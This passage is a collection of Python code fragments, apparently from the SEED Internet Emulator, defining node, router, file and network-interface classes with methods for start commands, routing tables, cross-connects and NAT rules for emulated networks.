fork))\n\n        return self\n\n    def appendStartCommand(self, cmd: str, fork: bool = False) -> Node:\n        \"\"\"!\n        @brief Add new command to start script.\n\n        The command should not be a blocking command. If you need to run a\n        blocking command, set fork to true and fork it to the background so\n        that it won't block the execution of other commands.\n\n        @param cmd command to add.\n        @param fork (optional) fork to command to background?\n\n        Use this to add start steps to the node. For example, if using the\n        \"docker\" compiler, this will be added to start.sh.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__start_commands.append((cmd, fork))\n\n        return self\n\n    def getStartCommands(self) -> List[Tuple[str, bool]]:\n        \"\"\"!\n        @brief Get start commands.\n\n        @returns list of tuples, where the first element is command, and the\n        second element indicates if this command should be forked.\n        \"\"\"\n        return self.__start_commands\n\n    def getInterfaces(self) -> List[Interface]:\n        \"\"\"!\n        @brief Get list of interfaces.\n\n        @returns list of interfaces.\n        \"\"\"\n        return self.__interfaces\n\n    def addSharedFolder(self, nodePath: str, hostPath: str) -> Node:\n        \"\"\"!\n        @@brief Add a new shared folder between the node and host.\n\n        @param nodePath path to the folder inside the container.\n        @param hostPath path to the folder on the emulator host node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__shared_folders[nodePath] = hostPath\n\n        return self\n\n    def getSharedFolders(self) -> Dict[str, str]:\n        \"\"\"!\n        @brief Get shared folders between the node and host.\n\n        @returns dict, where key is the path in container and value is path on\n        host.\n        \"\"\"\n        return self.__shared_folders\n\n    def addPersistentStorage(self, path: str) -> Node:\n        \"\"\"!\n        @brief Add persistent storage to node.\n\n        Nodes usually start fresh when you re-start them. This allow setting a\n        directory where data will be persistent.\n\n        @param path path to put the persistent storage folder in the container.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__persistent_storages.append(path)\n\n        return self\n\n    def getPersistentStorages(self) -> List[str]:\n        \"\"\"!\n        @brief Get persistent storage folders on the node.\n\n        @returns list of persistent storage folder.\n        \"\"\"\n        return self.__persistent_storages\n\n    def copySettings(self, node: Node):\n        \"\"\"!\n        @brief copy settings from another node.\n\n        @param node node to copy from.\n        \"\"\"\n        if node.getDisplayName() != None: self.setDisplayName(node.getDisplayName())\n        if node.getDescription() != None: self.setDescription(node.getDescription())\n        if node.getClasses()     != None: self.setClasses(node.getClasses())\n\n        # TODO:\n        # It is called in Emulator::render\n        # Render steps are (1) Render Base, (2) Get pending targets(vnode name) from Service layers,\n        # (3) Resolve bindings for all vnodes, (4) Applying changes made to virtual physical nodes to real physical nodes,\n        # (5) Render Services.\n        # copySettings is called in the step (4) and the base system is replaced when in the step (5)\n        # if node.getBaseSystem() != None : self.setBaseSystem(node.getClasses())\n\n        for (h, n, p) in node.getPorts(): self.addPort(h, n, p)\n        for p in node.getPersistentStorages(): self.addPersistentStorage(p)\n        for (c, f) in node.getStartCommands(): self.appendStartCommand(c, f)\n        for c in node.getBuildCommands(): self.addBuildCommand(c)\n        for s in node.getSoftware(): self.addSoftware(s)\n\n        for file in node.getFiles():\n            (path, content) = file.get()\n            self.setFile(path, content)\n\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Node {}:\\n'.format(self.__name)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Role: {}\\n'.format(self.__role)\n        out += ' ' * indent\n\n        out += 'Interfaces:\\n'\n        for interface in self.__interfaces:\n            out += interface.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Files:\\n'\n        for file in self.__files.values():\n            out += file.print(indent + 4)\n\n        out += ' ' * indent\n        out += 'Software:\\n'\n        indent += 4\n        for software in self.__softwares:\n            out += ' ' * indent\n            out += '{}\\n'.format(software)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Additional Build Commands:\\n'\n        indent += 4\n        for cmd in self.__build_commands:\n            out += ' ' * indent\n            out += '{}\\n'.format(cmd)\n        indent -= 4\n\n        out += ' ' * indent\n        out += 'Additional Start Commands:\\n'\n        indent += 4\n        for (cmd, fork) in self.__start_commands:\n            out += ' ' * indent\n            out += '{}{}\\n'.format(cmd, ' (fork)' if fork else '')\n        indent -= 4\n\n        return out",
  "class Router(Node):\n    \"\"\"!\n    @brief Node extension class.\n\n    Nodes with routing install will be replaced with this to get the extension\n    methods.\n    \"\"\"\n\n    __loopback_address: str\n\n    def setLoopbackAddress(self, address: str):\n        \"\"\"!\n        @brief Set loopback address.\n\n        @param address address.\n        \"\"\"\n        self.__loopback_address = address\n\n    def getLoopbackAddress(self) -> str:\n        \"\"\"!\n        @brief Get loopback address.\n\n        @returns address.\n        \"\"\"\n        return self.__loopback_address\n\n    def addProtocol(self, protocol: str, name: str, body: str) -> Router:\n        \"\"\"!\n        @brief Add a new protocol to BIRD on the given node.\n\n        @param protocol protocol type. (e.g., bgp, ospf)\n        @param name protocol name.\n        @param body protocol body.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.appendFile(\"/etc/bird/bird.conf\", RouterFileTemplates[\"protocol\"].format(\n            protocol = protocol,\n            name = name,\n            body = body\n        ))\n\n        return self\n\n    def addTablePipe(self, src: str, dst: str = 'master4', importFilter: str = 'none', exportFilter: str = 'all', ignoreExist: bool = True) -> Router:\n        \"\"\"!\n        @brief add a new routing table pipe.\n\n        @param src src table.\n        @param dst (optional) dst table (default: master4)\n        @param importFilter (optional) filter for importing from dst table to src table (default: none)\n        @param exportFilter (optional) filter for exporting from src table to dst table (default: all)\n        @param ignoreExist (optional) assert check if table exists. If true, error is silently discarded.\n\n        @throws AssertionError if pipe between two tables already exist and ignoreExist is False.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        meta = self.getAttribute('__routing_layer_metadata', {})\n        if 'pipes' not in meta: meta['pipes'] = {}\n        pipes = meta['pipes']\n        if src not in pipes: pipes[src] = []\n        if dst in pipes[src]:\n            assert ignoreExist, 'pipe from {} to {} already exist'.format(src, dst)\n            return\n        pipes[src].append(dst)\n        self.appendFile('/etc/bird/bird.conf', RouterFileTemplates[\"pipe\"].format(\n            src = src,\n            dst = dst,\n            importFilter = importFilter,\n            exportFilter = exportFilter\n        ))\n\n        return self\n\n    def addTable(self, tableName: str) -> Router:\n        \"\"\"!\n        @brief Add a new routing table to BIRD on the given node.\n\n        @param tableName name of the new table.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        meta = self.getAttribute('__routing_layer_metadata', {})\n        if 'tables' not in meta: meta['tables'] = []\n        tables = meta['tables']\n        if tableName not in tables: self.appendFile('/etc/bird/bird.conf', 'ipv4 table {};\\n'.format(tableName))\n        tables.append(tableName)\n\n        return self",
  "class RealWorldRouter(Router):\n    \"\"\"!\n    @brief RealWorldRouter class.\n\n    This class extends the router node to supporting routing prefix to real\n    world.\n\n    @todo real world access.\n    \"\"\"\n\n    __realworld_routes: List[str]\n    __sealed: bool\n    __hide_hops: bool\n\n    def initRealWorld(self, hideHops: bool):\n        \"\"\"!\n        @brief init RealWorldRouter.\n        \"\"\"\n        if hasattr(self, '__sealed'): return\n        self.__realworld_routes = []\n        self.__sealed = False\n        self.__hide_hops = hideHops\n        self.addSoftware('iptables')\n\n    def addRealWorldRoute(self, prefix: str) -> RealWorldRouter:\n        \"\"\"!\n        @brief Add real world route.\n\n        @param prefix prefix.\n\n        @throws AssertionError if sealed.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__sealed, 'Node sealed.'\n        self.__realworld_routes.append(prefix)\n\n        return self\n\n    def getRealWorldRoutes(self) -> List[str]:\n        \"\"\"!\n        @brief Get list of real world prefixes.\n\n        @returns list of prefixes.\n        \"\"\"\n        return self.__realworld_routes\n\n    def seal(self):\n        \"\"\"!\n        @brief seal the realworld router.\n\n        Use this method to \"seal\" the router (add static protocol.) No new real\n        world routes can be added once the node is sealed.\n        \"\"\"\n        if self.__sealed: return\n        self.__sealed = True\n        if len(self.__realworld_routes) == 0: return\n        self.setFile('/rw_configure_script', RouterFileTemplates['rw_configure_script'])\n        self.insertStartCommand(0, '/rw_configure_script')\n        self.insertStartCommand(0, 'chmod +x /rw_configure_script')\n        self.addTable('t_rw')\n        statics = '\\n    ipv4 { table t_rw; import all; };\\n    route ' + ' via !__default_gw__!;\\n    route '.join(self.__realworld_routes)\n        statics += ' via !__default_gw__!;\\n'\n        for prefix in self.__realworld_routes:\n            # nat matched only\n            self.appendFile('/rw_configure_script', 'iptables -t nat -A POSTROUTING -d {} -j MASQUERADE\\n'.format(prefix))\n\n            if self.__hide_hops:\n                # remove realworld hops\n                self.appendFile('/rw_configure_script', 'iptables -t mangle -A POSTROUTING -d {} -j TTL --ttl-set 64\\n'.format(prefix))\n\n        self.addProtocol('static', 'real_world', statics)\n        self.addTablePipe('t_rw', 't_bgp', exportFilter = 'filter { bgp_large_community.add(LOCAL_COMM); bgp_local_pref = 40; accept; }')\n        # self.addTablePipe('t_rw', 't_ospf') # TODO\n\n\n    def print(self, indent: int) -> str:\n        out = super(RealWorldRouter, self).print(indent)\n        indent += 4\n\n        out += ' ' * indent\n        out += 'Real-world prefixes:\\n'\n\n        indent += 4\n        for prefix in self.__realworld_routes:\n            out += ' ' * indent\n            out += '{}\\n'.format(prefix)\n\n\n        return out",
  "class ScionRouter(Router):\n    \"\"\"!\n    @brief Extends Router nodes for SCION routing.\n\n    SCION border router nodes will be replaced with this class during ScionRouting\n    layer configuration.\n    \"\"\"\n\n    __interfaces: Dict[int, Dict]  # IFID to interface\n    __next_port: int               # Next free UDP port\n\n    def __init__(self):\n        super().__init__()\n        self.initScionRouter()\n\n    def initScionRouter(self):\n        self.__interfaces = {}\n        self.__next_port = 50000\n\n    def addScionInterface(self, ifid: int, iface: Dict) -> None:\n        \"\"\"!\n        @brief Add a SCION interface to the border router.\n\n        @param ifid Interface ID of the new interface.\n        @param iface Interface definition.\n        \"\"\"\n        assert ifid not in self.__interfaces, f\"interface {ifid} already exists\"\n        self.__interfaces[ifid] = iface\n\n    def getScionInterface(self, ifid: int) -> Dict:\n        \"\"\"!\n        @brief Retrieve an existing interface.\n\n        @param ifid Interface ID to look up.\n        @throws AssertionError if the interface does not exist.\n        \"\"\"\n        assert ifid in self.__interfaces, f\"interface {ifid} does not exist\"\n        return self.__interfaces[ifid]\n\n    def getScionInterfaces(self) -> Dict[int, Dict]:\n        \"\"\"!\n        @brief Get all border router interfaces.\n        @returns IFIDs and interface declarations for border router.\n        \"\"\"\n        return self.__interfaces\n\n    def getNextPort(self) -> int:\n        \"\"\"!\n        @brief Get the next free UDP port. Called during configuration.\n        \"\"\"\n        port = self.__next_port\n        self.__next_port += 1\n        return port",
  "def __init__(self, path: str, content: str = ''):\n        \"\"\"!\n        @brief File constructor.\n\n        Put a file onto a node.\n\n        @param path path of the file.\n        @param content content of the file.\n        \"\"\"\n        self.__path = path\n        self.__content = content",
  "def setPath(self, path: str) -> File:\n        \"\"\"!\n        @brief Update file path.\n\n        @param path new path.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__path = path\n\n        return self",
  "def setContent(self, content: str) -> File:\n        \"\"\"!\n        @brief Update file content.\n\n        @param content content.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__content = content\n\n        return self",
  "def appendContent(self, content: str) -> File:\n        \"\"\"!\n        @brief Append to file.\n\n        @param content content.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__content += content\n\n        return self",
  "def get(self) -> Tuple[str, str]:\n        \"\"\"!\n        @brief Get file path and content.\n\n        @returns a tuple where the first element is path and second element is\n        content\n        \"\"\"\n        return (self.__path, self.__content)",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += \"{}:\\n\".format(self.__path)\n        indent += 4\n        for line in self.__content.splitlines():\n            out += ' ' * indent\n            out += '> '\n            out += line\n            out += '\\n'\n        return out",
  "def __init__(self, net: Network):\n        \"\"\"!\n        @brief Interface constructor.\n\n        @param net network to connect to.\n        \"\"\"\n        self.__address = None\n        self.__network = net\n        (l, b, d) = net.getDefaultLinkProperties()\n        self.__latency = l\n        self.__bandwidth = b\n        self.__drop = d",
  "def setLinkProperties(self, latency: int = 0, bandwidth: int = 0, packetDrop: float = 0) -> Interface:\n        \"\"\"!\n        @brief Set link properties.\n\n        @param latency (optional) latency to add to the link in ms, default 0.\n        @param bandwidth (optional) egress bandwidth of the link in bps, 0 for unlimited, default 0.\n        @param packetDrop (optional) link packet drop as percentage, 0 for unlimited, default 0.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        assert latency >= 0, 'invalid latency'\n        assert bandwidth >= 0, 'invalid bandwidth'\n        assert packetDrop >= 0 and packetDrop <= 100, 'invalid packet drop'\n\n        self.__latency = latency\n        self.__bandwidth = bandwidth\n        self.__drop = packetDrop\n\n        return self",
  "def getLinkProperties(self) -> Tuple[int, int, int]:\n        \"\"\"!\n        @brief Get link properties.\n\n        @returns tuple (latency, bandwidth, packet drop)\n        \"\"\"\n        return (self.__latency, self.__bandwidth, self.__drop)",
  "def getNet(self) -> Network:\n        \"\"\"!\n        @brief Get the network that this interface attached to.\n\n        @returns network.\n        \"\"\"\n        return self.__network",
  "def setAddress(self, address: IPv4Address) -> Interface:\n        \"\"\"!\n        @brief Set IPv4 address of this interface.\n\n        @param address address.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__address = address\n\n        return self",
  "def getAddress(self) -> IPv4Address:\n        \"\"\"!\n        @brief Get IPv4 address of this interface.\n\n        @returns address.\n        \"\"\"\n        return self.__address",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Interface:\\n'\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Connected to: {}\\n'.format(self.__network.getName())\n        out += ' ' * indent\n        out += 'Address: {}\\n'.format(self.__address)\n        out += ' ' * indent\n        out += 'Link Properties: {}\\n'.format(self.__address)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Added Latency: {} ms\\n'.format(self.__latency)\n        out += ' ' * indent\n        out += 'Egress Bandwidth Limit: {} bps\\n'.format('unlimited' if self.__bandwidth <= 0 else self.__bandwidth)\n\n        return out",
  "def __init__(self, name: str, role: NodeRole, asn: int, scope: str = None):\n        \"\"\"!\n        @brief Node constructor.\n\n        @name name name of this node.\n        @param role role of this node.\n        @param asn network that this node belongs to.\n        @param scope scope of the node, if not asn.\n        \"\"\"\n        super().__init__()\n\n        self.__interfaces = []\n        self.__files = {}\n        self.__imported_files = {}\n        self.__asn = asn\n        self.__role = role\n        self.__name = name\n        self.__classes = []\n        self.__label = {}\n        self.__scope = scope if scope != None else str(asn)\n        self.__softwares = set()\n        self.__build_commands = []\n        self.__start_commands = []\n        self.__ports = []\n        self.__privileged = False\n        self.__base_system = BaseSystem.DEFAULT\n\n        self.__pending_nets = []\n        self.__xcs = {}\n        self.__configured = False\n\n        self.__shared_folders = {}\n        self.__persistent_storages = []\n\n        # for soft in DEFAULT_SOFTWARE:\n        #     self.__softwares.add(soft)\n\n        self.__name_servers = []",
  "def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief configure the node. This is called when rendering.\n\n        NICs will be setup during the configuring process. No new interfaces\n        can be added after configuration.\n\n        @param emulator Emulator object to use to configure.\n        \"\"\"\n        assert not self.__configured, 'Node already configured.'\n        assert not self.__asn == 0, 'Virtual physical node must not be used in render/configure'\n\n        reg = emulator.getRegistry()\n\n        for (netname, address) in self.__pending_nets:\n\n            hit = False\n\n            if reg.has(self.__scope, \"net\", netname):\n                hit = True\n                self.__joinNetwork(reg.get(self.__scope, \"net\", netname), address)\n\n            if not hit and reg.has(\"ix\", \"net\", netname):\n                hit = True\n                self.__joinNetwork(reg.get(\"ix\", \"net\", netname), address)\n\n            if not hit and reg.has(\"seedemu\", \"net\", netname):\n                hit = True\n                self.__joinNetwork(reg.get(\"seedemu\", \"net\", netname), address)\n\n            assert hit, 'no network matched for name {}'.format(netname)\n\n        for (peername, peerasn) in list(self.__xcs.keys()):\n            peer: Node = None\n\n            if reg.has(str(peerasn), 'rnode', peername): peer = reg.get(str(peerasn), 'rnode', peername)\n            elif reg.has(str(peerasn), 'hnode', peername): peer = reg.get(str(peerasn), 'hnode', peername)\n            else: assert False, 'as{}/{}: cannot xc to node as{}/{}: no such node'.format(self.getAsn(), self.getName(), peerasn, peername)\n\n            (peeraddr, netname) = peer.getCrossConnect(self.getAsn(), self.getName())\n            (localaddr, _) = self.__xcs[(peername, peerasn)]\n            assert localaddr.network == peeraddr.network, 'as{}/{}: cannot xc to node as{}/{}: {}.net != {}.net'.format(self.getAsn(), self.getName(), peerasn, peername, localaddr, peeraddr)\n\n            if netname != None:\n                self.__joinNetwork(reg.get('xc', 'net', netname), str(localaddr.ip))\n                self.__xcs[(peername, peerasn)] = (localaddr, netname)\n            else:\n                # netname = 'as{}.{}_as{}.{}'.format(self.getAsn(), self.getName(), peerasn, peername)\n                netname = ''.join(choice(ascii_letters) for i in range(10))\n                net = Network(netname, NetworkType.CrossConnect, localaddr.network, direct = False) # TODO: XC nets w/ direct flag?\n                self.__joinNetwork(reg.register('xc', 'net', netname, net), str(localaddr.ip))\n                self.__xcs[(peername, peerasn)] = (localaddr, netname)\n\n        if len(self.__name_servers) == 0:\n            return\n\n        self.insertStartCommand(0,': > /etc/resolv.conf')\n        for idx, s in enumerate(self.__name_servers, start=1):\n            self.insertStartCommand(idx, 'echo \"nameserver {}\" >> /etc/resolv.conf'.format(s))",
  "def setNameServers(self, servers: List[str]) -> Node:\n        \"\"\"!\n        @brief set recursive name servers to use on this node. Overwrites\n        AS-level and emulator-level settings.\n\n        @param servers list of IP addresses of recursive name servers. Set to\n        empty list to use default (i.e., do not change, or use\n        AS-level/emulator-level settings)\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n\n        self.__name_servers = servers\n\n        return self",
  "def getNameServers(self) -> List[str]:\n        \"\"\"!\n        @brief get configured recursive name servers on this node.\n\n        @returns list of IP addresses of recursive name servers\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n\n        return self.__name_servers",
  "def addPort(self, host: int, node: int, proto: str = 'tcp') -> Node:\n        \"\"\"!\n        @brief Add port forwarding.\n\n        @param host port of the host.\n        @param node port of the node.\n        @param proto protocol.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__ports.append((host, node, proto))",
  "def addPortForwarding(self, host: int, node: int, proto:str = 'tcp') -> Node:\n        \"\"\"!\n        @brief Achieves the same as the addPort function.\n        @brief Keeping addPort to avoid breaking other examples.\n        @brief Just a more descriptive name.\n        \"\"\"\n        self.__ports.append((host, node, proto))",
  "def getPorts(self) -> List[Tuple[int, int, str]]:\n        \"\"\"!\n        @brief Get port forwardings.\n\n        @returns list of tuple of ports (host, node).\n\n        \"\"\"\n        return self.__ports",
  "def setPrivileged(self, privileged: bool) -> Node:\n        \"\"\"!\n        @brief Set or unset the node as privileged node.\n\n        Some backend like Docker will require the container to be privileged\n        in order to do some privileged operations.\n\n        @param privileged (optional) set if node is privileged.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__privileged = privileged",
  "def isPrivileged(self) -> bool:\n        \"\"\"!\n        @brief Test if node is set to privileged.\n\n        @returns True if privileged, False otherwise.\n        \"\"\"\n        return self.__privileged",
  "def setBaseSystem(self, base_system: BaseSystem) -> Node:\n        \"\"\"!\n        @brief Set a base_system of a node.\n\n        @param base_system base_system to use.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__base_system = base_system",
  "def getBaseSystem(self) -> BaseSystem:\n        \"\"\"!\n        @brief Get configured base system on this node.\n\n        @returns base system.\n        \"\"\"\n        return self.__base_system",
  "def __joinNetwork(self, net: Network, address: str = \"auto\"):\n        \"\"\"!\n        @brief Connect the node to a network.\n        @param net network to connect.\n        @param address (optional) override address assignment.\n\n        @throws AssertionError if network does not exist.\n        \"\"\"\n\n        if address == \"auto\": _addr = net.assign(self.__role, self.__asn)\n        elif address == \"dhcp\":\n            _addr = None\n            self.__name_servers = []\n            self.addSoftware('isc-dhcp-client')\n            self.setFile('dhclient.sh', '''\\\n            #!/bin/bash\n            ip addr flush {iface}\n            err=$(dhclient {iface} 2>&1)\n\n            if [ -z \"$err\" ]\n            then\n                    echo \"dhclient success\"\n            else\n                    filename=$(echo $err | cut -d \"'\" -f 2)\n                    cp $filename /etc/resolv.conf\n                    rm $filename\n            fi\n            '''.format(iface=net.getName()))\n            self.appendStartCommand('chmod +x dhclient.sh; ./dhclient.sh')\n\n        else: _addr = IPv4Address(address)\n\n        _iface = Interface(net)\n        _iface.setAddress(_addr)\n\n        self.__interfaces.append(_iface)\n\n        net.associate(self)",
  "def joinNetwork(self, netname: str, address: str = \"auto\") -> Node:\n        \"\"\"!\n        @brief Connect the node to a network.\n        @param netname name of the network.\n        @param address (optional) override address assignment.\n\n        @returns assigned IP address\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        assert not self.__configured, 'Node already configured.'\n\n        self.__pending_nets.append((netname, address))\n\n        return self",
  "def updateNetwork(self, netname:str, address: str= \"auto\") -> Node:\n        \"\"\"!\n        @brief Update connection of the node to a network.\n        @param netname name of the network.\n        @param address (optional) override address assignment.\n\n        @returns assigned IP address\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n\n        for pending_netname, pending_address in self.__pending_nets:\n            if pending_netname == netname:\n                self.__pending_nets.remove((pending_netname, pending_address))\n\n        self.__pending_nets.append((netname, address))\n\n        return self",
  "def crossConnect(self, peerasn: int, peername: str, address: str) -> Node:\n        \"\"\"!\n        @brief create new p2p cross-connect connection to a remote node.\n        @param peername node name of the peer node.\n        @param peerasn asn of the peer node.\n        @param address address to use on the interface in CIDR notation. Must\n        be within the same subnet.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        assert peername != self.getName() or peerasn != self.getName(), 'cannot XC to self.'\n        self.__xcs[(peername, peerasn)] = (IPv4Interface(address), None)",
  "def getCrossConnect(self, peerasn: int, peername: str) -> Tuple[IPv4Interface, str]:\n        \"\"\"!\n        @brief retrieve IP address for the given peer.\n        @param peername node name of the peer node.\n        @param peerasn asn of the peer node.\n\n        @returns tuple of IP address and XC network name. XC network name will\n        be None if the network has not yet been created.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        assert (peername, peerasn) in self.__xcs, 'as{}/{} is not in the XC list.'.format(peerasn, peername)\n        return self.__xcs[(peername, peerasn)]",
  "def getCrossConnects(self) -> Dict[Tuple[str, int], Tuple[IPv4Interface, str]]:\n        \"\"\"!\n        @brief get all cross connects on this node.\n\n        @returns dict, where key is (peer node name, peer node asn) and value is (address on interface, netname)\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        return self.__xcs",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get node name.\n\n        @returns name.\n        \"\"\"\n        return self.__name",
  "def getAsn(self) -> int:\n        \"\"\"!\n        @brief Get node parent AS ASN.\n\n        @returns asn.\n        \"\"\"\n        return self.__asn",
  "def getRole(self) -> NodeRole:\n        \"\"\"!\n        @brief Get role of current node.\n\n        Get role type of current node.\n\n        @returns role.\n        \"\"\"\n        return self.__role",
  "def appendClassName(self, className:str) -> Node:\n        \"\"\"!\n        @brief Append class to a current node\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__classes.append(className)\n\n        return self",
  "def getClasses(self) -> list:\n        \"\"\"!\n        @brief Get service of current node\n\n        @returns service\n        \"\"\"\n\n        return self.__classes",
  "def setClasses(self, classes:list) -> list:\n        \"\"\"!\n        @brief Set service of current node\n\n        @returns self for chaining API calls.\n        \"\"\"\n        self.__classes = classes\n        return self",
  "def setLabel(self, key:str, value:str) -> Node:\n        \"\"\"!\n        @brief Add Label to a current node\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        self.__label[key] = value\n        return self",
  "def getLabel(self) -> dict:\n        return self.__label",
  "def getFile(self, path: str) -> File:\n        \"\"\"!\n        @brief Get a file object, and create if not exist.\n\n        @param path file path.\n        @returns file.\n        \"\"\"\n        if path in self.__files: return self.__files[path]\n        self.__files[path] = File(path)\n        return self.__files[path]",
  "def getFiles(self) -> List[File]:\n        \"\"\"!\n        @brief Get all files.\n\n        @return list of files.\n        \"\"\"\n        return self.__files.values()",
  "def setFile(self, path: str, content: str) -> Node:\n        \"\"\"!\n        @brief Set content of the file.\n\n        @param path path of the file. Will be created if not exist, and will be\n        override if already exist.\n        @param content file content.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.getFile(path).setContent(content)\n\n        return self",
  "def appendFile(self, path: str, content: str) -> Node:\n        \"\"\"!\n        @brief Append content to a file.\n\n        @param path path of the file. Will be created if not exist.\n        @param content content to append.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.getFile(path).appendContent(content)\n\n        return self",
  "def getImportedFiles(self) -> Dict[str, str]:\n        \"\"\"!\n        @brief Get imported files.\n\n        @returns dict of imported files, where key = path of the file in the\n        container, value = path of the file on the host.\n        \"\"\"\n        return self.__imported_files",
  "def importFile(self, hostpath: str, containerpath: str) -> Node:\n        \"\"\"!\n        @brief Import a file from the host to the container.\n\n        @param hostpath path of the file on the host. (should be absolute to\n        prevent issues)\n        @param containerpath path of the file in the container.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__imported_files[containerpath] = hostpath\n\n        return self",
  "def addSoftware(self, name: str) -> Node:\n        \"\"\"!\n        @brief Add new software to node.\n\n        @param name software package name.\n\n        Use this to add software to the node. For example, if using the \"docker\"\n        compiler, this will be added as an \"apt-get install\" line in Dockerfile.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if ' ' in name:\n            for soft in name.split(' '):\n                self.__softwares.add(soft)\n        else:\n            self.__softwares.add(name)\n\n        return self",
  "def getSoftware(self) -> Set[str]:\n        \"\"\"!\n        @brief Get set of software.\n\n        @returns set of softwares.\n        \"\"\"\n        return self.__softwares",
  "def addBuildCommand(self, cmd: str) -> Node:\n        \"\"\"!\n        @brief Add new command to build step.\n\n        Use this to add build steps to the node. For example, if using the\n        \"docker\" compiler, this will be added as a \"RUN\" line in Dockerfile.\n\n        @param cmd command to add.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__build_commands.append(cmd)\n\n        return self",
  "def getBuildCommands(self) -> List[str]:\n        \"\"\"!\n        @brief Get build commands.\n\n        @returns list of commands.\n        \"\"\"\n        return self.__build_commands",
  "def insertStartCommand(self, index: int, cmd: str, fork: bool = False) -> Node:\n        \"\"\"!\n        @brief Add new command to start script.\n\n        The command should not be a blocking command. If you need to run a\n        blocking command, set fork to true and fork it to the background so\n        that it won't block the execution of other commands.\n\n        Use this to add start steps to the node. For example, if using the\n        \"docker\" compiler, this will be added to start.sh.\n\n        @param index index to insert command in.\n        @param cmd command to add.\n        @param fork (optional) fork to command to background?\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__start_commands.insert(index, (cmd, fork))\n\n        return self",
  "def appendStartCommand(self, cmd: str, fork: bool = False) -> Node:\n        \"\"\"!\n        @brief Add new command to start script.\n\n        The command should not be a blocking command. If you need to run a\n        blocking command, set fork to true and fork it to the background so\n        that it won't block the execution of other commands.\n\n        @param cmd command to add.\n        @param fork (optional) fork to command to background?\n\n        Use this to add start steps to the node. For example, if using the\n        \"docker\" compiler, this will be added to start.sh.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__start_commands.append((cmd, fork))\n\n        return self",
  "def getStartCommands(self) -> List[Tuple[str, bool]]:\n        \"\"\"!\n        @brief Get start commands.\n\n        @returns list of tuples, where the first element is command, and the\n        second element indicates if this command should be forked.\n        \"\"\"\n        return self.__start_commands",
  "def getInterfaces(self) -> List[Interface]:\n        \"\"\"!\n        @brief Get list of interfaces.\n\n        @returns list of interfaces.\n        \"\"\"\n        return self.__interfaces",
  "def addSharedFolder(self, nodePath: str, hostPath: str) -> Node:\n        \"\"\"!\n        @@brief Add a new shared folder between the node and host.\n\n        @param nodePath path to the folder inside the container.\n        @param hostPath path to the folder on the emulator host node.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__shared_folders[nodePath] = hostPath\n\n        return self",
  "def getSharedFolders(self) -> Dict[str, str]:\n        \"\"\"!\n        @brief Get shared folders between the node and host.\n\n        @returns dict, where key is the path in container and value is path on\n        host.\n        \"\"\"\n        return self.__shared_folders",
  "def addPersistentStorage(self, path: str) -> Node:\n        \"\"\"!\n        @brief Add persistent storage to node.\n\n        Nodes usually start fresh when you re-start them. This allow setting a\n        directory where data will be persistent.\n\n        @param path path to put the persistent storage folder in the container.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__persistent_storages.append(path)\n\n        return self",
  "def getPersistentStorages(self) -> List[str]:\n        \"\"\"!\n        @brief Get persistent storage folders on the node.\n\n        @returns list of persistent storage folder.\n        \"\"\"\n        return self.__persistent_storages",
